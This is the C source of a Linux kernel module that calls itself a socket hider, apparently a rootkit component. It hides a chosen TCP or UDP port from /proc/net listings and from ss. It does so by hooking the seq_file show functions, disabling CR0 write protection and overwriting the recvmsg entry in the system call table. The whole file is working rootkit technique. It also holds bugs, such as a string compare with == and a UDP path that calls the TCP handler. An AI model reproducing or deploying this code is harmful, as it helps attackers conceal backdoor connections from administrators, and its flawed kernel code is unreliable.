#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <asm/page.h>
#include <linux/unistd.h>
#include <linux/sysfs.h>
#include <linux/delay.h>

#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>
#include <linux/socket.h>
//#include "fs/proc/internal.h" 

#include "sysmap.h"

/* modinfo information */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
MODULE_DESCRIPTION("Hides sockets.");

/* module parameters */
static char tlp_version[4];
module_param_string(protocol, tlp_version, 4, 0);
static int port_number;
module_param(port_number, int, 0);

/* call counter to prevent unhooking the syscall while it is still in use */
static int call_counter = 0;

/* pointer to the sys_call_table */
void **sys_call_table;

/* the original syscalls we are hooking */
asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);



/* since this sturct is no longer available in proc_fs, taken from fs/proc/internal.h */
struct proc_dir_entry {
          unsigned int low_ino;
          umode_t mode;
          nlink_t nlink;
          kuid_t uid;
          kgid_t gid;
          loff_t size;
          const struct inode_operations *proc_iops;
          const struct file_operations *proc_fops;
          struct proc_dir_entry *next, *parent, *subdir;
          void *data;
          atomic_t count;         /* use count */
          atomic_t in_use;        /* number of callers into module in progress; */
                          /* negative -> it's going away RSN */
          struct completion *pde_unload_completion;
          struct list_head pde_openers;   /* who did ->open, but not ->release */
          spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
          u8 namelen;
          char name[];
  };


/* Access the port number and if it should be hidden then return 0 else return the original function */
static int manipulated_tcp_show(struct seq_file* m, void *v)
{
	int port;
	struct sock *sk;
	struct inet_sock *inet;

	if(SEQ_START_TOKEN == v)
		return original_tcp_show(m,v);
	sk = (struct sock *) v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);
	
	if(port == port_number && tlp_version == "tcp")
	{
		return 0;
	}

	return original_tcp_show(m,v);
}

/* Access the port number for udp and if it should be hidden then return 0 else return the original function */
static int manipulated_udp_show(struct seq_file* m, void *v)
{
        int port;
        struct sock *sk;
        struct inet_sock *inet;

        if(SEQ_START_TOKEN == v)
	{
                return original_tcp_show(m,v);
	}
        sk = (struct sock *) v;
        inet = inet_sk(sk);
        port = ntohs(inet->inet_sport);
        
        if(port == port_number)// && tlp_version == "udp")
	{
                return 0;
	}

        return original_udp_show(m,v);
}

/* Check if we need to hide this socket */
static int checkport(struct nlmsghdr *nlh)
{
	struct inet_diag_msg *r = NLMSG_DATA(nlh);
    	int lport = ntohs(r->id.idiag_sport);
	
		
	if(lport == port_number) 
	{
		printk("matched the version \n");
		return 1;
	}
	
	return 0;
}

/* our custom recvmsg, checks for the port number and hides it from ss*/
asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags)
{
	
	long ret;
    	long count; 
    	struct nlmsghdr* h;
    	__kernel_size_t numblocks;
    	struct inet_diag_msg *r;
    	char* currhdr;
    	int i;
    	int found=0;
    	int offset;

		
        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
        numblocks = msg->msg_iovlen;
        r = NLMSG_DATA(h);
       
	// compute the length of original call 
        ret = original_recvmsg(sockfd,msg,flags);
        
	// count holds the bytes remaining
        count = ret;
        
	// now, we remove the sockets to be hidden from the result...
        found = 1;
	
	while (NLMSG_OK(h, count)) 
	{
            	if (found == 0)
		{
                	h = NLMSG_NEXT(h, count);
            	}
            
		currhdr = (char*)h;
            	if (checkport(h))
	    	{
                	found = 1;
	                offset = NLMSG_ALIGN((h)->nlmsg_len);
        	        for (i=0; i<count; ++i)
			{
                	    	// "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
                    		currhdr[i] = currhdr[i + offset];
                	}
                
			ret = ret - offset;
            	}	
            
		else 
		{
                	found = 0;
            	}
        }
	
	return ret;

	
//return original_recvmsg(sockfd,msg,flags);
}




/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (value & 0x00010000)
        {
                value &= ~0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (!(value & 0x00010000))
        {
                value |= 0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}



/* the init function */
static int __init hidemodule_init(void)
{
	printk(KERN_INFO "Loading socket_hider LKM...\n");

        /* get the location of the sys_call_table from our sysmap.h file */
        sys_call_table = (void*) sysmap_sys_call_table;

	struct proc_dir_entry *proc = init_net.proc_net->subdir;
    	struct tcp_seq_afinfo *tcp_seq = 0;
    	struct udp_seq_afinfo *udp_seq = 0;
	int count = 0;
	
	while(proc && count<2)
	{	
		if(strcmp(proc->name, "tcp") == 0)
		{	
			tcp_seq = proc->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = manipulated_tcp_show;
			count++;
		}
		if(strcmp(proc->name, "udp") == 0)
		{
			udp_seq = proc->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = manipulated_udp_show;
			count++;
		} 
		proc = proc->next;
	}

        /* disable the write-protection */
        disable_page_protection();

        /*
         * keep pointer to original function in original_socketcall, and
         * replace the system call in the system call table with
         * manipulated_socketcall
         */
        original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
	sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
        /* reenable the write-protection */
        enable_page_protection();

	return 0;
}



/* the unload function */
static void __exit hidemodule_exit(void)
{
	printk(KERN_INFO "Unloading sockethider module... bye!\n");
	
	while(call_counter > 0)
	{
		msleep(2);
	}
        struct proc_dir_entry *proc = init_net.proc_net->subdir;
	struct tcp_seq_afinfo *tcp_seq = 0;
    	struct udp_seq_afinfo *udp_seq = 0;
	int count = 0;
	
	while(proc && count<2)
	{
		if (strcmp(proc->name, "tcp") == 0)
		{
            		tcp_seq = proc->data;
	                tcp_seq->seq_ops.show = original_tcp_show;
            		count++;
        	}
		if(strcmp(proc->name, "udp") == 0)
		{
			udp_seq = proc->data;
			udp_seq->seq_ops.show = original_udp_show;
			count++;
		}
	
		proc = proc->next;
	}

	
	/* disable the write-protection */
        disable_page_protection();

        /* Return the system call back to original */
        sys_call_table[__NR_recvmsg] = (unsigned long *)original_recvmsg;
	
        /* reenable the write-protection */
        enable_page_protection();
}

module_init(hidemodule_init);
module_exit(hidemodule_exit);

